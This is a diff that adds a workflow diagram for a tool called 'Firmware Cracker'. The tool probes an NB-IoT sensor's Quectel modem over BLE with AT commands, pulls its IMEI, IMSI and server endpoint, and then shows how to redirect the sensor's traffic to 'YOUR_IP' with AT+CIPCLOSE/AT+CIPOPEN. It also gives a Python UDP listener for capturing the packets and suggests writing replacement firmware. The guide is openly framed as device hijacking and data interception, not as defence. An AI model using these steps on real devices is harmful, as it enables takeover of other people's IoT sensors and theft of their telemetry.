@@ -1,0 +1,203 @@
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                    FIRMWARE CRACKER - WORKFLOW DIAGRAM                        ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 1: CONNECT TO SENSOR                                                   │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+    [NB-IoT Sensor]  <------ BLE ------>  [Your Computer]
+         │                                      │
+         │  Nordic UART Service                 │
+         │  UUID: 6e400002/6e400003             │
+         │                                      │
+         └──────────────────────────────────────┘
+
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 2: PROBE AT COMMANDS (42 Commands)                                     │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+    Computer                          Sensor
+       │                                │
+       │──── AT+CIPOPEN? ──────────────>│  Query active connections
+       │<─── +CIPOPEN: 0,"UDP",... ─────│  Response with server info
+       │                                │
+       │──── AT+CGSN ──────────────────>│  Query IMEI
+       │<─── 351469520687041 ───────────│  Response with IMEI
+       │                                │
+       │──── AT+CGPADDR ───────────────>│  Query local IP
+       │<─── +CGPADDR: 1,"10.x.x.x" ───│  Response with IP
+       │                                │
+       │──── [40 more commands] ────────>│
+       │<─── [responses] ───────────────│
+       │                                │
+
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 3: EXTRACT INTELLIGENCE                                                │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+    Raw AT Responses
+         │
+         ├──> Device Identity Parser
+         │         │
+         │         ├─> IMEI: 351469520687041
+         │         ├─> IMSI: 502153012345678
+         │         ├─> Firmware: BG96MAR02A07M1G
+         │         └─> Manufacturer: Quectel
+         │
+         ├──> Network Endpoint Parser
+         │         │
+         │         ├─> Remote IP: 103.xxx.xxx.xxx  ◄── CRITICAL!
+         │         ├─> Remote Port: 5000           ◄── CRITICAL!
+         │         ├─> Protocol: UDP               ◄── CRITICAL!
+         │         ├─> Local IP: 10.123.45.67
+         │         └─> APN: m2mxnbiot
+         │
+         └──> Signal Quality Parser
+                   │
+                   ├─> RSRP: -85 dBm
+                   ├─> SNR: 8 dB
+                   └─> Operator: Maxis
+
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 4: GENERATE REPORTS                                                    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+    Intelligence Data
+         │
+         ├──> Screen Summary
+         │         │
+         │         └─> [DEVICE IDENTITY]
+         │             IMEI: 351469520687041
+         │             
+         │             [NETWORK ENDPOINTS]
+         │             Remote Server: 103.xxx.xxx.xxx:5000
+         │
+         └──> JSON Report
+                   │
+                   └─> reports/firmware_intelligence_20260213_124500.json
+                       {
+                         "device_identity": {...},
+                         "network_endpoints": {...},
+                         "raw_responses": {...}
+                       }
+
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 5: USE THE INTELLIGENCE                                                │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║ OPTION A: REDIRECT SERVER VIA AT COMMANDS                                ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    You now know:
+    ✓ Current Server: 103.xxx.xxx.xxx:5000
+    ✓ Protocol: UDP
+    ✓ Connection ID: 0
+
+    Send via BLE:
+    1. AT+CIPCLOSE=0                          ← Close current connection
+    2. AT+CIPOPEN=0,"UDP","YOUR_IP",YOUR_PORT ← Open to YOUR server
+    3. AT+CIPOPEN?                            ← Verify it worked
+
+    Result:
+    [Sensor] ──UDP──> [YOUR SERVER] ✓
+
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║ OPTION B: BUILD INTERCEPTOR SERVER                                       ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    You now know:
+    ✓ Protocol: UDP
+    ✓ Port: 5000
+    ✓ Data format: Hex packets
+
+    Build UDP server:
+    import socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(("0.0.0.0", 5000))
+    
+    while True:
+        data, addr = sock.recvfrom(1024)
+        print(f"From {addr}: {data.hex()}")
+
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║ OPTION C: DEVELOP CUSTOM FIRMWARE                                        ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    You now know:
+    ✓ AT command set supported
+    ✓ Device capabilities
+    ✓ Network configuration
+    ✓ Modem model: Quectel BG96
+
+    Develop firmware that:
+    - Reads sensors (ultrasonic, IMU)
+    - Formats data YOUR way
+    - Sends to YOUR server
+    - Uses YOUR protocol
+
+
+═══════════════════════════════════════════════════════════════════════════════
+
+                        KEY INTELLIGENCE EXTRACTED
+
+═══════════════════════════════════════════════════════════════════════════════
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 🔴 CRITICAL - Server Configuration                                          │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  Remote Server IP    : 103.xxx.xxx.xxx  ◄── WHERE DATA GOES                │
+│  Remote Port         : 5000             ◄── WHICH PORT                      │
+│  Protocol            : UDP              ◄── HOW IT'S SENT                   │
+│  Connection ID       : 0                ◄── CONNECTION IDENTIFIER           │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 🟡 HIGH - Device Identity                                                   │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  IMEI                : 351469520687041  ◄── DEVICE ID                       │
+│  IMSI                : 502153012345678  ◄── SIM ID                          │
+│  ICCID               : 896012...        ◄── SIM CARD ID                     │
+│  Firmware Version    : BG96MAR02A07M1G  ◄── FIRMWARE                        │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ 🟢 MEDIUM - Network Configuration                                           │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  Local IP            : 10.123.45.67     ◄── SENSOR'S CELLULAR IP            │
+│  APN                 : m2mxnbiot        ◄── NETWORK ACCESS POINT            │
+│  Operator            : Maxis            ◄── NETWORK PROVIDER                │
+│  RSRP                : -85 dBm          ◄── SIGNAL STRENGTH                 │
+│  SNR                 : 8 dB             ◄── SIGNAL QUALITY                  │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+
+═══════════════════════════════════════════════════════════════════════════════
+
+                            QUICK REFERENCE
+
+═══════════════════════════════════════════════════════════════════════════════
+
+TO RUN:
+    cd "Firmware Cracker"
+    Start_Firmware_Cracker.bat
+
+TO REDIRECT SERVER:
+    AT+CIPCLOSE=0
+    AT+CIPOPEN=0,"UDP","YOUR_IP",YOUR_PORT
+
+TO BUILD SERVER:
+    Listen on UDP port 5000
+    Parse hex packets
+
+TO READ REPORTS:
+    reports/firmware_intelligence_*.json
+
+═══════════════════════════════════════════════════════════════════════════════
